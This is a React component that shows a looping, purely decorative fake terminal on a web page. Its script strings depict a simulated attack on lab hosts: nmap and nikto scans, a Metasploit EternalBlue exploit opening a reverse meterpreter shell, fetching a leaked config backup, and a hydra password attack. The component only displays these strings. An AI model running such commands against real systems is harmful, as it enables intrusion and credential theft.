"use client";

import { useEffect, useRef, useState } from "react";

// Purely decorative — no input, no network calls, no real tools. A scripted
// transcript of a recon → exploit flow against fictional lab hosts (the
// 10.10.10.x range is the well-known HTB/CTF lab convention, not a real
// target), looping forever as ambient flavor below the real Terminal.
type ScriptLine =
  | { type: "cmd"; text: string }
  | { type: "out"; text: string; tone?: "default" | "success" | "error" | "muted" | "heading" }
  | { type: "blank" };

const PROMPT = "root@kali:~#";
const CHAR_DELAY_MS = 22;
const POST_CMD_DELAY_MS = 220;
const OUTPUT_LINE_DELAY_MS = 55;
const LOOP_RESTART_DELAY_MS = 2200;
const MAX_LINES = 80;

const SCRIPT: ScriptLine[] = [
  { type: "cmd", text: "nmap -sV -sC -T4 10.10.10.15" },
  { type: "out", text: "Starting Nmap 7.94 ( https://nmap.org )", tone: "muted" },
  { type: "out", text: "Nmap scan report for 10.10.10.15" },
  { type: "out", text: "Host is up (0.021s latency).", tone: "muted" },
  { type: "blank" },
  { type: "out", text: "PORT     STATE SERVICE      VERSION", tone: "heading" },
  { type: "out", text: "22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu" },
  { type: "out", text: "80/tcp   open  http         Apache httpd 2.4.41" },
  { type: "out", text: "445/tcp  open  microsoft-ds Samba smbd 4.6.2" },
  { type: "blank" },
  { type: "out", text: "Nmap done: 1 IP address (1 host up) scanned in 12.41s", tone: "muted" },
  { type: "blank" },
  { type: "cmd", text: "nmap --script vuln -p 445 10.10.10.15" },
  { type: "out", text: "PORT    STATE SERVICE", tone: "heading" },
  { type: "out", text: "445/tcp open  microsoft-ds" },
  { type: "out", text: "| smb-vuln-ms17-010:" },
  { type: "out", text: "|   VULNERABLE:", tone: "error" },
  { type: "out", text: "|   Remote Code Execution in Microsoft SMBv1 (ms17-010)", tone: "error" },
  { type: "out", text: "|_    CVE:CVE-2017-0143", tone: "muted" },
  { type: "blank" },
  { type: "cmd", text: "searchsploit eternalblue" },
  { type: "out", text: "MS17-010 EternalBlue SMB RCE            | windows/remote/42315.py" },
  { type: "blank" },
  { type: "cmd", text: "msfconsole -q" },
  { type: "out", text: "msf6 > use exploit/windows/smb/ms17_010_eternalblue" },
  { type: "out", text: "msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.15" },
  { type: "out", text: "RHOSTS => 10.10.10.15", tone: "muted" },
  { type: "out", text: "msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp" },
  { type: "out", text: "PAYLOAD => windows/x64/meterpreter/reverse_tcp", tone: "muted" },
  { type: "out", text: "msf6 exploit(ms17_010_eternalblue) > exploit" },
  { type: "blank" },
  { type: "out", text: "[*] Started reverse TCP handler on 10.10.14.6:4444", tone: "muted" },
  { type: "out", text: "[+] 10.10.10.15:445 - Connection established for exploitation.", tone: "success" },
  { type: "out", text: "[*] Sending stage (200262 bytes) to 10.10.10.15", tone: "muted" },
  { type: "out", text: "[+] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.10.10.15)", tone: "success" },
  { type: "blank" },
  { type: "out", text: "meterpreter > getuid" },
  { type: "out", text: "Server username: NT AUTHORITY\\SYSTEM", tone: "success" },
  { type: "out", text: "meterpreter > [session closed — lab reset]", tone: "muted" },
  { type: "blank" },
  { type: "blank" },
  { type: "cmd", text: "nmap -sV -p- 10.10.10.42" },
  { type: "out", text: "PORT     STATE SERVICE   VERSION", tone: "heading" },
  { type: "out", text: "22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu" },
  { type: "out", text: "80/tcp   open  http       nginx 1.14.0" },
  { type: "out", text: "8080/tcp open  http-proxy nginx 1.14.0" },
  { type: "blank" },
  { type: "out", text: "Nmap done: 1 IP address (1 host up) scanned in 21.03s", tone: "muted" },
  { type: "blank" },
  { type: "cmd", text: "nikto -h http://10.10.10.42" },
  { type: "out", text: "+ Server: nginx/1.14.0" },
  { type: "out", text: "+ /admin/: Admin login page found.", tone: "error" },
  { type: "out", text: "+ /config.php.bak: Backup file — source disclosure risk.", tone: "error" },
  { type: "blank" },
  { type: "cmd", text: "curl -s http://10.10.10.42/config.php.bak" },
  { type: "out", text: "DB_USER=svc_web", tone: "muted" },
  { type: "out", text: "DB_PASS=Summer2023!", tone: "muted" },
  { type: "blank" },
  { type: "cmd", text: "hydra -l admin -P rockyou.txt 10.10.10.42 http-post-form" },
  { type: "out", text: "[80][http-post-form] host: 10.10.10.42   login: admin   password: Summer2023!", tone: "success" },
  { type: "out", text: "1 of 1 target successfully completed, 1 valid password found", tone: "muted" },
  { type: "blank" },
  { type: "out", text: "[*] Access confirmed. Rotating to next lab host...", tone: "muted" },
];

// Only ever called from inside the effect below (client-only, post-mount),
// never during render — checking it during render would make the very
// first client render disagree with the server-rendered (window-less) HTML.
function prefersReducedMotion(): boolean {
  return window.matchMedia("(prefers-reduced-motion: reduce)").matches;
}

const toneClassName: Record<NonNullable<Extract<ScriptLine, { type: "out" }>["tone"]>, string> = {
  default: "text-accent/80",
  success: "text-accent",
  error: "text-red-400",
  muted: "text-accent/50",
  heading: "text-accent/60",
};

interface HistoryLine {
  id: number;
  text: string;
  className: string;
}

let nextLineId = 0;

const STATIC_FRAME: HistoryLine[] = SCRIPT.filter(
  (line): line is Extract<ScriptLine, { type: "out" }> => line.type === "out",
).map((line) => ({
  id: nextLineId++,
  text: line.text,
  className: toneClassName[line.tone ?? "default"],
}));

export function AutoTerminal() {
  // Starts empty in every environment (server render, then the client's
  // first hydration pass) so there's nothing for React to reconcile — the
  // real content, static or animated, only ever appears after mount.
  const [history, setHistory] = useState<HistoryLine[]>([]);
  const [typedCmd, setTypedCmd] = useState("");
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const el = scrollRef.current;
    if (el) el.scrollTo({ top: el.scrollHeight });
  }, [history, typedCmd]);

  useEffect(() => {
    if (prefersReducedMotion()) {
      // Deferred rather than called synchronously here — same reasoning as
      // the animated path below, just a single frame instead of a loop.
      const id = setTimeout(() => setHistory(STATIC_FRAME), 0);
      return () => clearTimeout(id);
    }

    let cancelled = false;
    let timeoutId: ReturnType<typeof setTimeout>;

    const push = (text: string, className: string) => {
      setHistory((prev) => {
        const next = [...prev, { id: nextLineId++, text, className }];
        return next.length > MAX_LINES ? next.slice(next.length - MAX_LINES) : next;
      });
    };

    function typeCommand(text: string, onDone: () => void) {
      let i = 0;
      const step = () => {
        if (cancelled) return;
        i++;
        setTypedCmd(text.slice(0, i));
        timeoutId = setTimeout(
          i < text.length ? step : onDone,
          i < text.length ? CHAR_DELAY_MS : POST_CMD_DELAY_MS,
        );
      };
      step();
    }

    function runLine(index: number) {
      if (cancelled) return;
      if (index >= SCRIPT.length) {
        timeoutId = setTimeout(() => {
          setHistory([]);
          runLine(0);
        }, LOOP_RESTART_DELAY_MS);
        return;
      }

      const line = SCRIPT[index];
      if (line.type === "cmd") {
        typeCommand(line.text, () => {
          push(`${PROMPT} ${line.text}`, "text-accent/90");
          setTypedCmd("");
          runLine(index + 1);
        });
      } else if (line.type === "blank") {
        push(" ", "");
        timeoutId = setTimeout(() => runLine(index + 1), OUTPUT_LINE_DELAY_MS);
      } else {
        push(line.text, toneClassName[line.tone ?? "default"]);
        timeoutId = setTimeout(() => runLine(index + 1), OUTPUT_LINE_DELAY_MS);
      }
    }

    runLine(0);

    return () => {
      cancelled = true;
      clearTimeout(timeoutId);
    };
  }, []);

  return (
    <div className="flex h-full min-h-0 flex-col bg-terminal-surface font-mono text-xs">
      <div className="flex shrink-0 items-center gap-2 border-b border-foreground/10 px-3 py-1.5">
        <span className="relative flex h-1.5 w-1.5">
          <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-accent/60" />
          <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-accent" />
        </span>
        <span className="text-[10px] tracking-wide text-foreground/40 uppercase">
          Auto-Recon — Simulated Feed
        </span>
      </div>
      <div
        ref={scrollRef}
        className="min-h-0 flex-1 overflow-auto p-2 whitespace-pre"
      >
        {history.map((line) => (
          <p key={line.id} className={line.className || "text-accent/80"}>
            {line.text}
          </p>
        ))}
        {typedCmd && (
          <p className="text-accent/90">
            {PROMPT} {typedCmd}
            <span className="animate-blink">▋</span>
          </p>
        )}
      </div>
    </div>
  );
}
